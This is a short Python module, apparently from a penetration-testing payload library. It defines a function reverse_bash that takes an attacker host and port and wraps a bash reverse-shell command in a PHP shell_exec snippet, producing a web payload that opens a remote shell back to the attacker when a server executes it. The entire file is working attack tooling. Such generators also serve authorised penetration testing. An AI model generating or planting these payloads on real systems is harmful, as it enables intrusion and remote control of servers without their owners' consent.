__all__ = ['reverse_bash']

from json import dumps as to_json
from string import Formatter

from ...cmd.unix import reverse_bash as bash_cmd
from ...util import kwdefaults_from


def _php_escape(__s: str) -> str:
    return to_json(__s, ensure_ascii=False).replace('$', r'\$')


class PhpAdapter(Formatter):
    def format_field(self, value, format_spec):
        return _php_escape(super().format_field(value, format_spec))


_php_adapter = PhpAdapter().format


@kwdefaults_from(bash_cmd)
def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
    return _php_adapter(
        "<pre><?= shell_exec({}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
    )
